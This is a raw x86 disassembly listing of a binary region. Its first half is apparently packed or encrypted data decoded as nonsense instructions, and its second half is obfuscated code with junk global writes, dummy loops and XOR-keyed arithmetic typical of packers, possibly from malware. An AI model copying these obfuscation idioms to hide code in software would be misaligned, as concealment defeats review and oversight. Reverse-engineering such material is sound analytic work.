  41889b:	imul   edi,DWORD PTR [ebx-0x5ebe857c],0x18
  4188a2:	jae    0x4188af
  4188a4:	pop    edx
  4188a5:	hlt    
  4188a6:	test   DWORD PTR [ebp-0x7e],ecx
  4188a9:	(bad)  
  4188aa:	into   
  4188ab:	je     0x4188ab
  4188ad:	leave  
  4188ae:	inc    esi
  4188af:	and    DWORD PTR [ecx+0x7d],edx
  4188b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188b3:	push   eax
  4188b4:	inc    eax
  4188b5:	lds    esp,FWORD PTR [edx+0x58]
  4188b8:	inc    ecx
  4188b9:	jle    0x418853
  4188bb:	test   DWORD PTR [ecx+ebp*4],edx
  4188be:	pop    ecx
  4188bf:	jae    0x41891f
  4188c1:	rol    BYTE PTR [ebx+0x2a],1
  4188c4:	popf   
  4188c5:	in     eax,dx
  4188c6:	call   0x9366d4f5
  4188cb:	int3   
  4188cc:	or     BYTE PTR [ebp-0x79],cl
  4188cf:	loop   0x4188ca
  4188d1:	mov    eax,0xbb0264e7
  4188d6:	mov    dl,BYTE PTR [ebx-0xb]
  4188d9:	fisub  WORD PTR [edx+0x21]
  4188dc:	and    eax,0x13158638
  4188e1:	ds jmp 0x88f:0x7d89fbaf
  4188e9:	push   esp
  4188ea:	adc    dh,BYTE PTR [ecx]
  4188ec:	std    
  4188ed:	loop   0x418937
  4188ef:	adc    BYTE PTR [eax+ecx*1],al
  4188f2:	push   ds
  4188f3:	push   es
  4188f4:	lds    edx,FWORD PTR [ebx-0x7]
  4188f7:	pop    ds
  4188f8:	ins    BYTE PTR es:[edi],dx
  4188f9:	retf   0xd1d1
  4188fc:	aam    0x64
  4188fe:	mov    ah,0x76
  418900:	push   eax
  418901:	or     DWORD PTR [esi+0x45223b0],0x2d
  418908:	mov    edi,0xc1cac546
  41890d:	lods   al,BYTE PTR ds:[esi]
  41890e:	xchg   ebp,eax
  41890f:	enter  0x38ab,0x21
  418913:	ins    BYTE PTR es:[edi],dx
  418914:	loop   0x4188e9
  418916:	sar    BYTE PTR [ecx],0xa7
  418919:	adc    ecx,DWORD PTR [eax+0x11fdc80e]
  41891f:	mov    dl,0x78
  418921:	lods   al,BYTE PTR ds:[esi]
  418922:	loop   0x41898b
  418924:	ret    0x67ec
  418927:	int    0x55
  418929:	mov    ebp,ecx
  41892b:	mov    esp,0x22423276
  418930:	mov    cl,BYTE PTR [edi-0xcc88244]
  418936:	dec    eax
  418937:	adc    edx,ebx
  418939:	sub    BYTE PTR [esi-0x24],ah
  41893c:	xlat   BYTE PTR ds:[ebx]
  41893d:	jae    0x418999
  41893f:	fwait
  418940:	adc    al,0xd9
  418942:	dec    edx
  418943:	cmp    DWORD PTR [edx+ebx*4-0x45],edx
  418947:	mov    ebx,DWORD PTR [esi-0x23ad831f]
  41894d:	mov    eax,ds:0xeaabb2cf
  418952:	fisttp DWORD PTR [edi]
  418954:	sub    eax,0x838d94dc
  418959:	lahf   
  41895a:	lea    ebp,[edi+esi*4+0xc]
  41895e:	(bad)  
  41895f:	shr    DWORD PTR [eax+0x40],1
  418962:	and    DWORD PTR [ebp+0x10],esi
  418965:	mov    ebp,0x87e00071
  41896a:	cs xchg esi,eax
  41896c:	lods   eax,DWORD PTR ds:[esi]
  41896d:	jg     0x418958
  41896f:	dec    edx
  418970:	xor    ah,BYTE PTR [ecx+0x444989b2]
  418976:	and    BYTE PTR [eax-0x69],cl
  418979:	add    BYTE PTR [esi+0x20],bh
  41897c:	fs jae 0x418951
  41897f:	xor    esp,DWORD PTR [ecx+esi*8+0x1f41327f]
  418986:	loope  0x4189eb
  418988:	push   esp
  418989:	jnp    0x418954
  41898b:	jmp    0x6378020d
  418990:	cmp    eax,0xe1c882d3
  418995:	mov    dl,0xc4
  418997:	repz or ah,BYTE PTR [esp+edi*2-0x2c07ae46]
  41899f:	mov    ecx,0x4f0f2464
  4189a4:	mov    eax,0x9cbebe44
  4189a9:	lock jno 0x41894a
  4189ac:	icebp  
  4189ad:	iret   
  4189ae:	sbb    BYTE PTR [ecx-0x62],0xf3
  4189b2:	pop    es
  4189b3:	mov    bl,0x1a
  4189b5:	lods   al,BYTE PTR ds:[esi]
  4189b6:	dec    eax
  4189b7:	fisub  DWORD PTR [edx]
  4189b9:	icebp  
  4189ba:	cmp    esi,DWORD PTR [ebp-0x2c]
  4189bd:	push   0xffffffe2
  4189bf:	mov    bl,0xdb
  4189c1:	bound  edi,QWORD PTR [esi+0x56]
  4189c4:	(bad)  
  4189c5:	aam    0xbb
  4189c7:	push   esp
  4189c8:	pop    ebx
  4189c9:	data16 cmp al,0x9a
  4189cc:	mov    ah,0xdc
  4189ce:	sbb    esp,esi
  4189d0:	outs   dx,BYTE PTR ds:[esi]
  4189d1:	bound  ecx,QWORD PTR [edx+0x74fb4aa]
  4189d7:	sbb    ch,cl
  4189d9:	mov    eax,DWORD PTR [edi+edx*2+0x8cc28ee]
  4189e0:	mov    eax,ds:0x83c84470
  4189e5:	mov    BYTE PTR [ecx],0xc7
  4189e8:	scas   al,BYTE PTR es:[edi]
  4189e9:	fdivr  QWORD PTR [eax+0x40]
  4189ec:	fbstp  TBYTE PTR [ebp+0x46a0bfe6]
  4189f2:	xchg   edx,edi
  4189f4:	aad    0x14
  4189f6:	sar    DWORD PTR [eax+eax*4-0x4d],1
  4189fa:	mov    al,0x10
  4189fc:	enter  0x4305,0xbb
  418a00:	pusha  
  418a01:	in     eax,0x94
  418a03:	jecxz  0x41898d
  418a05:	pop    ebp
  418a06:	cmp    edi,DWORD PTR [bx+di-0x4886]
  418a0b:	jl     0x4189f5
  418a0d:	sbb    DWORD PTR [ecx],ebp
  418a0f:	pop    edi
  418a10:	aaa    
  418a11:	sub    eax,0x84f60bc9
  418a16:	sub    eax,0xc6098b26
  418a1b:	cs cmp edx,ecx
  418a1e:	push   ss
  418a1f:	jns    0x4189eb
  418a21:	or     dh,ch
  418a23:	cmp    BYTE PTR [edi-0x2f05a6e5],bl
  418a29:	out    0x3,al
  418a2b:	and    al,0x72
  418a2d:	popf   
  418a2e:	xor    al,0x91
  418a30:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a32:	mov    ecx,0x561020ae
  418a37:	iret   
  418a38:	inc    ebp
  418a39:	xor    BYTE PTR [edx-0x30],ah
  418a3c:	out    dx,al
  418a3d:	pop    ds
  418a3e:	int    0xe7
  418a40:	pusha  
  418a41:	stos   DWORD PTR es:[edi],eax
  418a42:	call   0x2a4d0530
  418a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a48:	sub    ebp,edi
  418a4a:	retf   
  418a4b:	pop    ecx
  418a4c:	addr16 xchg esp,eax
  418a4e:	lods   eax,DWORD PTR ds:[esi]
  418a4f:	fidiv  WORD PTR [ecx-0x16]
  418a52:	or     ah,ah
  418a54:	daa    
  418a55:	cmc    
  418a56:	pop    ebx
  418a57:	test   al,0x66
  418a59:	mov    eax,0x8270e794
  418a5e:	icebp  
  418a5f:	fcomip st,st(3)
  418a61:	jbe    0x4189f1
  418a63:	shr    BYTE PTR [esi-0x74],0x92
  418a67:	sub    al,0xdd
  418a69:	xor    DWORD PTR ds:0xb3cc6667,ecx
  418a6f:	push   ss
  418a70:	cmp    ecx,DWORD PTR [edi+0x40]
  418a73:	fisub  WORD PTR [eax]
  418a75:	(bad)  
  418a76:	lods   al,BYTE PTR ds:[esi]
  418a77:	xchg   edx,eax
  418a78:	add    BYTE PTR [ebx],cl
  418a7a:	mov    esp,0xe391ff5c
  418a7f:	ja     0x418abc
  418a81:	imul   edx,DWORD PTR [ecx+ebx*2-0x12],0xffffffb2
  418a86:	int3   
  418a87:	clc    
  418a88:	inc    esi
  418a89:	mov    al,0xcf
  418a8b:	xchg   ebx,eax
  418a8c:	std    
  418a8d:	call   0xd93b:0x16e383a3
  418a94:	std    
  418a95:	out    dx,al
  418a96:	xor    ah,al
  418a98:	rcr    edi,1
  418a9a:	push   es
  418a9b:	sar    DWORD PTR [edx+edx*2],0x9d
  418a9f:	push   ebp
  418aa0:	cwde   
  418aa1:	enter  0xecfc,0x1d
  418aa5:	pop    es
  418aa6:	or     al,0xfa
  418aa8:	mov    bl,0xf8
  418aaa:	xchg   esi,eax
  418aab:	imul   DWORD PTR [esi]
  418aad:	call   0xf11f0f16
  418ab2:	gs jne 0x418a63
  418ab5:	cmp    al,0x9
  418ab7:	nop
  418ab8:	adc    eax,0x695afc2c
  418abd:	xor    DWORD PTR [ebp+0x74],0xfc317e7
  418ac4:	imul   ecx,DWORD PTR [edx-0xb2a4b22],0x68
  418acb:	retf   
  418acc:	mov    eax,0x7d9b75a1
  418ad1:	adc    BYTE PTR [edx],0x11
  418ad4:	sbb    DWORD PTR [eax-0x48],0x26
  418ad8:	dec    ecx
  418ad9:	int    0x17
  418adb:	mov    ah,0xb0
  418add:	lahf   
  418ade:	lods   al,BYTE PTR ds:[esi]
  418adf:	jbe    0x418aa3
  418ae1:	js     0x418b31
  418ae3:	push   eax
  418ae4:	aas    
  418ae5:	imul   edx,DWORD PTR [esi+0x26],0x455ff697
  418aec:	push   ebp
  418aed:	(bad)  
  418aee:	adc    DWORD PTR [ecx-0x5423fedc],ebx
  418af4:	cmp    ecx,esi
  418af6:	jnp    0x418b50
  418af8:	push   es
  418af9:	psubsw mm6,mm4
  418afc:	jg     0x418b14
  418afe:	pop    ss
  418aff:	jae    0x418aab
  418b01:	sub    eax,0x59564eba
  418b06:	and    al,0xc7
  418b08:	aam    0x2c
  418b0a:	mov    WORD PTR [edx],cs
  418b0c:	in     eax,dx
  418b0d:	ss stos WORD PTR es:[edi],ax
  418b10:	sar    DWORD PTR [edi+0x70],1
  418b13:	pop    ecx
  418b14:	hlt    
  418b15:	mov    ecx,0x49927be9
  418b1a:	pop    es
  418b1b:	inc    eax
  418b1c:	imul   esi,DWORD PTR [ebp-0x3e],0x11048f32
  418b23:	daa    
  418b24:	out    0x3b,eax
  418b26:	test   BYTE PTR [ecx+esi*2],al
  418b29:	push   ebp
  418b2a:	(bad)  
  418b2b:	jge    0x418b8b
  418b2d:	pusha  
  418b2e:	fs (bad) 
  418b30:	js     0x418b75
  418b32:	(bad)  
  418b33:	(bad)  [ecx+0x5e]
  418b36:	dec    ebp
  418b37:	ret    
  418b38:	out    dx,eax
  418b39:	(bad)  [esi*8+0x43404f0c]
  418b40:	lahf   
  418b41:	push   es
  418b42:	cmc    
  418b43:	aad    0xe0
  418b45:	jae    0x418ba4
  418b47:	pop    ds
  418b48:	nop
  418b49:	xor    ecx,DWORD PTR [eax]
  418b4b:	ins    BYTE PTR es:[edi],dx
  418b4c:	jmp    0xc0761a36
  418b51:	or     ebp,DWORD PTR [edx]
  418b53:	ins    DWORD PTR es:[edi],dx
  418b54:	add    ch,ah
  418b56:	fstp   QWORD PTR [edi-0x72d05346]
  418b5c:	(bad)  
  418b5d:	push   eax
  418b5e:	cmp    al,0x85
  418b60:	lods   eax,DWORD PTR ds:[esi]
  418b61:	iret   
  418b62:	loopne 0x418b3f
  418b64:	xchg   edx,eax
  418b65:	cmp    eax,0xbd897408
  418b6a:	sub    eax,0x13abf6ef
  418b6f:	inc    edx
  418b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b71:	pop    ecx
  418b72:	call   0xaf37fd92
  418b77:	fcmovnb st,st(6)
  418b79:	jecxz  0x418b31
  418b7b:	hlt    
  418b7c:	sar    DWORD PTR [esi-0x73],cl
  418b7f:	mov    dl,0xe8
  418b81:	cmp    edx,DWORD PTR [esi-0x2d4350ae]
  418b87:	xor    eax,0x3fed3e23
  418b8c:	push   0x1cfe2eec
  418b91:	push   0x46
  418b93:	out    dx,eax
  418b94:	(bad)  
  418b95:	mov    eax,ds:0x2a3768f
  418b9a:	fnsave [eax+0x2ab56bed]
  418ba0:	dec    ecx
  418ba1:	and    BYTE PTR [edi-0x1f],bl
  418ba4:	jl     0x418bb0
  418ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ba7:	and    esi,0x6
  418baa:	xchg   ecx,eax
  418bab:	xor    DWORD PTR [edi],esp
  418bad:	adc    dh,ch
  418baf:	jp     0x418c25
  418bb1:	int    0xce
  418bb3:	inc    edi
  418bb4:	outs   dx,DWORD PTR ds:[esi]
  418bb5:	inc    ecx
  418bb6:	adc    edx,DWORD PTR [esi]
  418bb8:	shl    DWORD PTR [ebx],cl
  418bba:	jmp    0x418bed
  418bbc:	mov    ecx,0x74c4075e
  418bc1:	push   ds
  418bc2:	and    DWORD PTR [edx+0x580e8124],0x15
  418bc9:	mov    bl,0x3f
  418bcb:	pusha  
  418bcc:	push   edx
  418bcd:	call   0x4171:0xd013d6ed
  418bd4:	sar    esp,0xc8
  418bd7:	mov    eax,ds:0x48e5fd1f
  418bdc:	ja     0x418c26
  418bde:	push   DWORD PTR ds:0x84342457
  418be4:	fstp   QWORD PTR [edi+0x9]
  418be7:	add    eax,0x3f46e20f
  418bec:	mov    al,0xf5
  418bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bef:	iret   
  418bf0:	cmp    eax,0xd7b0dbdb
  418bf5:	dec    edi
  418bf6:	outs   dx,BYTE PTR ds:[esi]
  418bf7:	cwde   
  418bf8:	(bad)  
  418bf9:	push   ecx
  418bfa:	add    DWORD PTR [edx+0x4cea395e],ebp
  418c00:	adc    al,0x5b
  418c02:	push   ds
  418c03:	test   al,0x6c
  418c05:	mov    bl,0xc1
  418c07:	dec    esp
  418c08:	outs   dx,DWORD PTR ds:[esi]
  418c09:	and    BYTE PTR [esi+edi*2],bh
  418c0c:	ret    
  418c0d:	dec    edx
  418c0e:	out    dx,eax
  418c0f:	mul    DWORD PTR [ebx]
  418c11:	addr16 sbb eax,0xeed52763
  418c17:	jno    0x418c68
  418c19:	mov    dl,0x4d
  418c1b:	push   0x4c
  418c1d:	inc    eax
  418c1e:	jnp    0x418bc0
  418c20:	in     al,dx
  418c21:	add    ecx,DWORD PTR [esi+ebx*1+0x6f89e2d7]
  418c28:	mov    cl,0x52
  418c2a:	outs   dx,BYTE PTR ds:[esi]
  418c2b:	mov    ah,0x5f
  418c2d:	mov    ch,0x28
  418c2f:	mov    ebx,0x961b5f52
  418c34:	scas   eax,DWORD PTR es:[edi]
  418c35:	std    
  418c36:	jmp    0x418bd6
  418c38:	(bad)  
  418c3a:	sub    BYTE PTR [eax-0x143aea4e],0x7a
  418c41:	outs   dx,BYTE PTR ds:[esi]
  418c42:	lods   al,BYTE PTR ds:[esi]
  418c43:	and    cl,BYTE PTR [esi+0x3e2b04d1]
  418c49:	popa   
  418c4a:	test   DWORD PTR ds:0x7478ccf0,edi
  418c50:	(bad)  
  418c51:	loopne 0x418c4f
  418c53:	xlat   BYTE PTR ds:[ebx]
  418c54:	jecxz  0x418c4a
  418c56:	or     dl,BYTE PTR [esi-0x4c]
  418c59:	clc    
  418c5a:	gs and eax,0xb38d7025
  418c60:	in     eax,dx
  418c61:	dec    ebp
  418c62:	cdq    
  418c63:	fs ffree st(0)
  418c66:	jnp    0x418c6d
  418c68:	hlt    
  418c69:	cs xor eax,0x2079a40f
  418c6f:	xor    dl,BYTE PTR [edi]
  418c71:	mov    ch,0x53
  418c73:	int3   
  418c74:	jnp    0x418c46
  418c76:	sub    BYTE PTR [ecx-0x1cb1b9d8],cl
  418c7c:	idiv   cl
  418c7e:	sbb    DWORD PTR ds:0x51d4352c,0x273dedca
  418c88:	inc    esp
  418c89:	xchg   edx,eax
  418c8a:	stos   DWORD PTR es:[edi],eax
  418c8b:	add    BYTE PTR [ecx+0x5de8b2ef],al
  418c91:	cli    
  418c92:	pop    eax
  418c93:	xor    DWORD PTR [esi],0xffffffb0
  418c96:	popf   
  418c97:	fbstp  TBYTE PTR [edx+0x5acf55d3]
  418c9d:	fwait
  418c9e:	pop    ebx
  418c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ca0:	lock das 
  418ca2:	retf   0xa336
  418ca5:	jl     0x418c8b
  418ca7:	out    dx,eax
  418ca8:	mov    ch,0x7a
  418caa:	xchg   esp,eax
  418cab:	ins    BYTE PTR es:[edi],dx
  418cac:	into   
  418cad:	push   ecx
  418cae:	mov    ebx,DWORD PTR [ecx]
  418cb0:	in     eax,0xd9
  418cb2:	mov    esp,0x15277d5a
  418cb7:	mov    esi,DWORD PTR ds:0x76291cf
  418cbd:	cmp    DWORD PTR [ebp+0x40],eax
  418cc0:	inc    edi
  418cc1:	cmp    DWORD PTR [edi+0x3d840d40],ebx
  418cc7:	mov    BYTE PTR [edx],al
  418cc9:	jne    0x418d2c
  418ccb:	pusha  
  418ccc:	sbb    eax,DWORD PTR [eax]
  418cce:	(bad)  
  418ccf:	jg     0x418c6a
  418cd1:	and    DWORD PTR [edi+0x70],ecx
  418cd4:	adc    edi,DWORD PTR [ecx+0x2c]
  418cd7:	xchg   edx,eax
  418cd8:	xchg   ebp,eax
  418cd9:	lds    ebx,FWORD PTR [eax+0x227ba325]
  418cdf:	ret    
  418ce0:	test   al,0xe7
  418ce2:	popf   
  418ce3:	dec    edi
  418ce4:	adc    bl,BYTE PTR [edi+0x1b935f75]
  418cea:	xchg   esi,eax
  418ceb:	fstp   DWORD PTR [ebp-0x49]
  418cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cef:	fxam   
  418cf1:	sub    esi,DWORD PTR [ebx+0x8]
  418cf4:	pop    ecx
  418cf5:	xchg   edx,eax
  418cf6:	pop    ebp
  418cf7:	push   edx
  418cf8:	xchg   ebp,eax
  418cfa:	sub    edi,0x25
  418cfd:	je     0x418d5d
  418cff:	mov    edx,0xb50cc711
  418d04:	(bad)  
  418d05:	sti    
  418d06:	sahf   
  418d07:	call   0x83c428ba
  418d0c:	xor    DWORD PTR [ebx-0x3ebee84e],0xffffffb1
  418d13:	data16 (bad) 
  418d16:	xor    edi,DWORD PTR [ecx-0x64]
  418d19:	hlt    
  418d1a:	repnz mov eax,ds:0x8a07f823
  418d20:	stc    
  418d21:	sub    eax,0xdc31447e
  418d26:	push   cs
  418d27:	push   0xffffffb6
  418d29:	sub    DWORD PTR [ebp-0x5467dc52],edi
  418d2f:	(bad)  
  418d30:	jmp    0x652:0xd46a9852
  418d37:	pop    ds
  418d38:	pop    esp
  418d39:	fstp   DWORD PTR [ecx-0x2c]
  418d3c:	loop   0x418d17
  418d3e:	dec    ebp
  418d3f:	mov    edx,0xdcd670c7
  418d44:	cdq    
  418d45:	pushf  
  418d46:	js     0x418ce7
  418d48:	xor    cl,ah
  418d4a:	jp     0x418d38
  418d4c:	push   eax
  418d4d:	aaa    
  418d4e:	enter  0x7d47,0xea
  418d52:	hlt    
  418d53:	pop    eax
  418d54:	jo     0x418dae
  418d56:	lods   al,BYTE PTR ds:[esi]
  418d57:	dec    eax
  418d58:	outs   dx,DWORD PTR ds:[esi]
  418d59:	and    al,0xd
  418d5b:	or     eax,DWORD PTR [esi-0x71c28ee7]
  418d61:	cmp    DWORD PTR [ebx+ebp*8+0x2dc8ad1c],ecx
  418d68:	mov    BYTE PTR [ebx],dh
  418d6a:	fldenv [ebx-0x58603eb0]
  418d70:	ror    DWORD PTR [esi+0x21],0xb3
  418d74:	loop   0x418d80
  418d76:	and    ecx,DWORD PTR [edi+0x50]
  418d79:	pop    ds
  418d7a:	inc    edi
  418d7b:	adc    esp,DWORD PTR [esi+0x5]
  418d7e:	ror    DWORD PTR [esi+0xf],0xc0
  418d82:	neg    BYTE PTR [esi+edi*1-0x40]
  418d86:	xchg   ebx,eax
  418d87:	cld    
  418d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d89:	sbb    al,bl
  418d8b:	lahf   
  418d8c:	or     edi,DWORD PTR [esi-0x33]
  418d8f:	and    BYTE PTR [eax],dl
  418d91:	xchg   esp,eax
  418d92:	ins    BYTE PTR es:[edi],dx
  418d93:	sub    DWORD PTR [ebx-0x13a8afb3],esp
  418d99:	inc    ebp
  418d9a:	cmp    eax,0x76dfd314
  418d9f:	sub    eax,0x4f3ac154
  418da4:	loopne 0x418d4c
  418da6:	cmc    
  418da7:	jmp    0xdbb04567
  418dac:	dec    ebp
  418dad:	cmp    eax,0xdeffb0f3
  418db2:	pop    es
  418db3:	in     al,0xdd
  418db5:	mov    eax,0x99f57420
  418dba:	mov    eax,0xd4858829
  418dbf:	rcr    BYTE PTR [edx+edx*1+0x6f71c5f0],1
  418dc6:	es aad 0x34
  418dc9:	cmp    esp,DWORD PTR [esi]
  418dcb:	cmp    esp,DWORD PTR [esi-0x5f]
  418dce:	jnp    0x418ded
  418dd0:	jns    0x418de4
  418dd2:	pop    edi
  418dd3:	test   eax,0xef6cb5d5
  418dd8:	and    al,0x8b
  418dda:	jns    0x418de1
  418ddc:	pop    es
  418ddd:	dec    ebx
  418dde:	ficomp DWORD PTR [edx]
  418de0:	sbb    eax,0x3cd584d2
  418de5:	dec    edx
  418de6:	pop    ebp
  418de7:	mov    edx,0xd6fa415e
  418dec:	pop    edx
  418ded:	dec    edx
  418dee:	repnz mov dh,bl
  418df1:	fs inc ebx
  418df3:	push   DWORD PTR ds:0x54dcf14f
  418df9:	or     BYTE PTR [ebx-0x34],0xd1
  418dfd:	dec    edi
  418dfe:	sbb    edx,DWORD PTR [esi+0x33]
  418e01:	push   esi
  418e02:	loop   0x418e5f
  418e04:	jmp    0xd45759cf
  418e09:	mov    edx,DWORD PTR [ebp-0x10]
  418e0c:	or     DWORD PTR ds:0x428e9b,0x120f
  418e16:	mov    ebx,DWORD PTR [ebp-0x8]
  418e19:	adc    DWORD PTR ds:0x428e7b,0x428ec3
  418e23:	xor    edx,eax
  418e25:	or     DWORD PTR ds:0x428ec3,0x428e27
  418e2f:	xor    ebx,eax
  418e31:	sub    edx,ebx
  418e33:	sub    edx,esi
  418e35:	sbb    DWORD PTR ds:0x428e8f,0x4a4
  418e3f:	xor    edx,eax
  418e41:	mov    DWORD PTR [ebp-0x10],edx
  418e44:	mov    edx,DWORD PTR ds:0x428e2b
  418e4a:	mov    edx,DWORD PTR [ebp-0x14]
  418e4d:	mov    DWORD PTR [ebp+0x8],edx
  418e50:	mov    DWORD PTR ds:0x428e7b,0x3079
  418e5a:	jmp    0x418fdc
  418e5f:	xor    DWORD PTR ds:0x428eb3,0x4ecc
  418e69:	mov    edx,DWORD PTR [ebp+0x8]
  418e6c:	mov    ebx,DWORD PTR [ebp-0x8]
  418e6f:	adc    DWORD PTR ds:0x428ecf,0x68d0
  418e79:	xor    edx,eax
  418e7b:	xor    ebx,eax
  418e7d:	sub    edx,ebx
  418e7f:	or     DWORD PTR ds:0x428e9b,ecx
  418e85:	sub    edx,esi
  418e87:	and    DWORD PTR ds:0x428e9f,0x0
  418e91:	jmp    0x418ea5
  418e96:	xor    ebx,ebx
  418e98:	xor    ebx,DWORD PTR ds:0x428e9f
  418e9e:	inc    ebx
  418e9f:	mov    DWORD PTR ds:0x428e9f,ebx
  418ea5:	cmp    DWORD PTR ds:0x428e9f,0x1e
  418eac:	jae    0x418eec
  418eb2:	cmp    DWORD PTR ds:0x428e9f,0xc
  418eb9:	jge    0x418eec
  418ebf:	jmp    0x418ecd
  418ec4:	push   DWORD PTR [ebp-0x18]
  418ec7:	call   DWORD PTR ds:0x42aa0f
  418ecd:	cmp    DWORD PTR ds:0x428e9f,0xb
  418ed4:	jne    0x418ee7
  418eda:	mov    ebx,DWORD PTR ds:0x428e9f
  418ee0:	inc    ebx
  418ee1:	mov    DWORD PTR ds:0x428e9f,ebx
  418ee7:	jmp    0x418e96
  418eec:	xor    edx,eax
  418eee:	mov    DWORD PTR [ebp+0x8],edx
  418ef1:	mov    edx,DWORD PTR [ebp+0x8]
  418ef4:	mov    ebx,DWORD PTR [ebp-0x58]
  418ef7:	sub    DWORD PTR ds:0x428e8f,0x48c7
  418f01:	add    edx,0x5708e4
  418f07:	and    DWORD PTR ds:0x428e2f,0x10a3
  418f11:	imul   edx,ebx
  418f14:	dec    ebx
  418f15:	mov    DWORD PTR [ebp-0x58],edx
  418f18:	adc    ebx,edx
  418f1a:	mov    edx,DWORD PTR [ebp+0x8]
  418f1d:	mov    ebx,DWORD PTR [ebp-0x54]
  418f20:	add    edx,0x64f882
  418f26:	or     edx,ebx
  418f28:	and    DWORD PTR ds:0x428e2b,edi
  418f2e:	mov    DWORD PTR [ebp-0x54],edx
  418f31:	mov    edx,DWORD PTR ds:0x428eeb
  418f37:	mov    ebx,DWORD PTR ds:0x428ef7
  418f3d:	sub    edx,ebx
  418f3f:	xor    edx,DWORD PTR [edx+ebx*1]
  418f42:	mov    edx,DWORD PTR [ebp+0x8]
  418f45:	mov    DWORD PTR ds:0x428ec3,0x13
  418f4f:	cmp    DWORD PTR ds:0x428ec3,0x0
  418f56:	je     0x418fa5
  418f5c:	cmp    DWORD PTR ds:0x428ec3,0x2
  418f63:	jl     0x418fa5
  418f69:	jmp    0x418f79
  418f6e:	push   0x4281a7
  418f73:	call   DWORD PTR ds:0x42aa13
  418f79:	cmp    DWORD PTR ds:0x428ec3,0x3
  418f80:	jne    0x418f93
  418f86:	mov    ebx,DWORD PTR ds:0x428ec3
  418f8c:	dec    ebx
  418f8d:	mov    DWORD PTR ds:0x428ec3,ebx
  418f93:	mov    ebx,DWORD PTR ds:0x428ec3
  418f99:	dec    ebx
  418f9a:	mov    DWORD PTR ds:0x428ec3,ebx
  418fa0:	jmp    0x418f4f
  418fa5:	mov    ebx,DWORD PTR [ebp-0x50]
  418fa8:	add    edx,ecx
  418faa:	xor    edx,ebx
  418fac:	mov    DWORD PTR [ebp-0x50],edx
  418faf:	mov    edx,DWORD PTR [ebp+0x8]
  418fb2:	mov    ebx,DWORD PTR [ebp-0x4c]
  418fb5:	add    edx,edi
  418fb7:	and    edx,ebx
  418fb9:	mov    DWORD PTR [ebp-0x4c],edx
  418fbc:	mov    edx,DWORD PTR [ebp+0x8]
  418fbf:	mov    ebx,DWORD PTR [ebp-0x48]
  418fc2:	lea    edx,[ebx+edx*1+0x241fcdf]
  418fc9:	mov    DWORD PTR [ebp-0x48],edx
  418fcc:	mov    edx,DWORD PTR [ebp+0x8]
  418fcf:	mov    ebx,0xfa5e1522
  418fd4:	sub    ebx,edx
  418fd6:	add    ebx,DWORD PTR [ebp-0x44]
  418fd9:	mov    DWORD PTR [ebp-0x44],ebx
  418fdc:	mov    edx,DWORD PTR [ebp+0x8]
  418fdf:	xor    edx,eax
  418fe1:	add    edx,esi
  418fe3:	jne    0x418e5f
  418fe9:	mov    edx,DWORD PTR [ebp-0xc]
  418fec:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ff3:	mov    bl,BYTE PTR [ebp-0x1]
  418ff6:	cmp    dl,bl
  418ff8:	je     0x4190d6
  418ffe:	mov    ecx,DWORD PTR [ebp-0x5c]
  419001:	mov    edx,DWORD PTR [ebp-0xc]
  419004:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41900b:	mov    ebx,DWORD PTR [ebp+0xc]
  41900e:	xor    ecx,eax
  419010:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f6]
  419017:	jne    0x41920a
  41901d:	mov    ecx,DWORD PTR [ebp-0x5c]
  419020:	mov    edx,DWORD PTR [ebp+0xc]
  419023:	xor    ecx,eax
  419025:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f6]
  41902d:	mov    edx,DWORD PTR [ebp-0x18]
  419030:	xor    edx,eax
  419032:	add    edx,esi
  419034:	cmp    ecx,edx
  419036:	mov    ecx,DWORD PTR [ebp-0x14]
  419039:	mov    DWORD PTR [ebp+0x8],ecx
  41903c:	mov    ecx,DWORD PTR [ebp+0x8]
  41903f:	je     0x419312
  419045:	xor    ecx,eax
  419047:	add    ecx,esi
  419049:	mov    ecx,0x242ebf1
  41904e:	je     0x41915e
  419054:	mov    edx,DWORD PTR [ebp+0x8]
  419057:	mov    ebx,DWORD PTR [ebp-0x8]
  41905a:	xor    edx,eax
  41905c:	xor    ebx,eax
  41905e:	sub    edx,ebx
  419060:	sub    edx,esi
  419062:	xor    edx,eax
  419064:	mov    DWORD PTR [ebp+0x8],edx
  419067:	mov    edx,DWORD PTR [ebp+0x8]
  41906a:	mov    ebx,DWORD PTR [ebp-0x58]
  41906d:	add    edx,0x5708e4
  419073:	imul   edx,ebx
  419076:	mov    DWORD PTR [ebp-0x58],edx
  419079:	mov    edx,DWORD PTR [ebp+0x8]
  41907c:	mov    ebx,DWORD PTR [ebp-0x54]
  41907f:	add    edx,0x64f882
  419085:	or     edx,ebx
  419087:	mov    DWORD PTR [ebp-0x54],edx
  41908a:	mov    edx,DWORD PTR [ebp+0x8]
  41908d:	mov    ebx,DWORD PTR [ebp-0x50]
  419090:	add    edx,ecx
  419092:	xor    edx,ebx
  419094:	mov    DWORD PTR [ebp-0x50],edx
  419097:	mov    edx,DWORD PTR [ebp+0x8]
  41909a:	mov    ebx,DWORD PTR [ebp-0x4c]
  41909d:	add    edx,edi
  41909f:	and    edx,ebx
  4190a1:	mov    DWORD PTR [ebp-0x4c],edx
  4190a4:	mov    edx,DWORD PTR [ebp+0x8]
  4190a7:	mov    ebx,DWORD PTR [ebp-0x48]
  4190aa:	lea    edx,[ebx+edx*1+0x241fcdf]
  4190b1:	mov    DWORD PTR [ebp-0x48],edx
  4190b4:	mov    edx,DWORD PTR [ebp+0x8]
  4190b7:	mov    ebx,0xfa5e1522
  4190bc:	sub    ebx,edx
  4190be:	add    ebx,DWORD PTR [ebp-0x44]
  4190c1:	mov    DWORD PTR [ebp-0x44],ebx
  4190c4:	mov    edx,DWORD PTR [ebp+0x8]
  4190c7:	xor    edx,eax
  4190c9:	add    edx,esi
  4190cb:	jne    0x419054
